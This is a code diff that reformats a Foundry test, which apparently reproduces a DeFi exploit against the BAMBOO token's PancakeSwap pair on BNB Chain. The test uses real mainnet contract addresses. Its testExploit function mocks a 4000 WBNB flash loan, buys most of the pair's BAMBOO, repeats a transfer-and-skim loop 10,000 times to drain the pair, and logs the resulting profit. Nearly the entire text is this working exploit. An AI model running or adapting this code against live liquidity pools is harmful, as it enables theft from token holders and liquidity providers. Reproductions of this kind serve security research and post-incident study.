@@ -27,7 +27,6 @@ contract BambooTest is Test {
     IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IUniswapV2Factory factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
 
-
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
@@ -47,37 +46,37 @@ contract BambooTest is Test {
         return result;
     }
 
-    function testExploit() public {        
+    function testExploit() public {
         // get a flash loan (lets mock it out)
         deal(address(wbnb), address(this), 4000 ether);
 
         console.log("start balance after flashloan", toEth(wbnb.balanceOf(address(this))));
 
-        uint bambooBalance = bamboo.balanceOf(address(wbnbBambooPair));
-     
+        uint256 bambooBalance = bamboo.balanceOf(address(wbnbBambooPair));
+
         address[] memory path;
         path = new address[](2);
         path[0] = address(wbnb);
         path[1] = address(bamboo);
         uint256[] memory amounts = router.getAmountsIn(bambooBalance * 9 / 10, path);
-       
+
         wbnb.approve(address(router), type(uint256).max);
         router.swapExactTokensForTokens(amounts[1], 0, path, address(this), block.timestamp);
 
-        uint256 max = 10000;
-        for(uint i; i < max; ++i) {
-            bamboo.transfer(address(wbnbBambooPair), 1343870967101818317);
+        uint256 max = 10_000;
+        for (uint256 i; i < max; ++i) {
+            bamboo.transfer(address(wbnbBambooPair), 1_343_870_967_101_818_317);
             wbnbBambooPair.skim(address(this));
         }
-        
+
         path[0] = address(bamboo);
         path[1] = address(wbnb);
         bamboo.approve(address(router), type(uint256).max);
 
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(bamboo.balanceOf(address(this))  ,0, path, address(this), block.timestamp);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            bamboo.balanceOf(address(this)), 0, path, address(this), block.timestamp
+        );
 
         console.log("profit after return flashloan", toEth(wbnb.balanceOf(address(this)) - 4000 ether));
     }
-
 }
-
